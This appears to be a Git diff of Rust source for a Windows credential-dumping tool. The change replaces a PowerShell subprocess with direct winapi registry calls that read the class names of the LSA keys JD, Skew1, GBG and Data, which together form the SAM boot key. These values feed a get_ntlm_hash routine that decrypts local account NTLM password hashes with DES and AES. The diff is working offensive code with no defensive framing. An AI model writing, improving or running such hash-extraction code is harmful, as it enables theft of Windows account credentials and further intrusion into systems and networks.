@@ -4,10 +4,18 @@ use crate::utilities::Utils;
 
 use des::decrypt;
 
-pub mod powershell_command;
-
 use winreg::enums::*;
 use winreg::RegKey;
+
+use winapi::um::winreg::{
+    RegQueryInfoKeyA,
+    RegOpenKeyExA
+};
+
+use winapi::shared::minwindef::{
+    HKEY, 
+    MAX_PATH
+};
 
 use regex::Regex;
 
@@ -16,8 +24,9 @@ use anyhow::{
     Result
 };
 
-use std::process::Command;
 use std::fmt::Write;
+use std::io::Error;
+use std::ffi::CString;
 
 use aes::Aes128;
 
@@ -156,24 +165,62 @@ fn extract_binary_data(input: String) -> Vec<u8> {
     return vector_str_to_vector_u8(bytes);
 }
 
-fn get_class_registry() -> String {
+fn collect_classnames() -> String {
     let keys = vec!["JD", "Skew1", "GBG", "Data"];
+    let mut result = String::new();
 
-    let mut total = String::new();
-
-    for keyname in keys {
-        let argument = format!("{}{}", powershell_command::get_imports(), powershell_command::get_keyclass(keyname));
-        let mut command = Command::new("powershell");
-        let output = format!("{:?}", command.arg(argument).output());
-
-        let split1: Vec<&str> = output.split(r#"stdout: ""#).collect();
-        let split2: Vec<&str> = split1[1].split(r#"\r\n""#).collect();
-        let output = split2[0];
-
-        total.push_str(output);
+    for key in keys {
+        let hkey = open_regkey(key.to_string());
+        result.push_str(read_classname(hkey).as_str());
     }
 
-    return total;
+    return result;
+}
+
+fn open_regkey(key: String) -> HKEY {
+    unsafe {
+        let mut hkey: HKEY = std::mem::zeroed();
+        let location = format!("SYSTEM\\CurrentControlSet\\Control\\Lsa\\{}", key);
+        let cstring = CString::new(location).unwrap();
+
+        if RegOpenKeyExA(
+            0x80000002 as HKEY,
+            cstring.as_ptr(),
+            0x0,
+            0x19,
+            &mut hkey,
+        ) != 0 {
+            println!("{}", Error::last_os_error());
+        }
+
+        hkey
+    }
+}
+
+fn read_classname(handle: HKEY) -> String {
+    unsafe {
+        let mut class: [i8; MAX_PATH] = std::mem::zeroed();
+        let mut class_size = MAX_PATH as *mut u32;
+
+        if RegQueryInfoKeyA(
+            handle,
+            class.as_mut_ptr(),
+            &mut class_size as *mut _ as *mut u32,
+            0 as *mut u32,
+            0 as *mut u32,
+            0 as *mut u32,
+            0 as *mut u32,
+            0 as *mut u32,
+            0 as *mut u32,
+            0 as *mut u32,
+            0 as *mut u32,
+            std::mem::zeroed(),
+        ) != 0 {
+            println!("Error getting classname: {}", Error::last_os_error());
+        }
+        let u8slice : &[u8] = std::slice::from_raw_parts(class.as_ptr() as *const u8, class.len());
+        return std::string::String::from_utf8_lossy(&u8slice).replace("\u{0}", "");
+    }
 }
 
 fn to_rid(input: String) -> usize {
@@ -203,14 +250,6 @@ fn aes_128_cbc_decrypt(key: &[u8], iv: &[u8], input: Vec<u8>) -> Result<Vec<u8>>
     let mut buf = input;
     return Ok(cipher.decrypt(&mut buf)?.to_vec());
 }
-
-// 000001F4
-// 000001F5
-// 000001F7
-// 000001F8
-// 000003E8
-// 000003E9
-
 
 fn str_to_key(input: Vec<u8>) -> [u8; 8] {
     let mut encoded_key = vec![];
@@ -265,7 +304,7 @@ fn get_ntlm_hash() -> Result<Vec<Ntlm>> {
         for user in users {
             if let Ok(v) = collect_v_bytes(user.clone()) {
                 if let Ok(f) = collect_f_bytes() {
-                    let class = get_class_registry();
+                    let class = collect_classnames();
 
                     let offset = get_i32_from_vector(&v[12..16]) + 204;
                     let len = get_i32_from_vector(&v[16..20]);
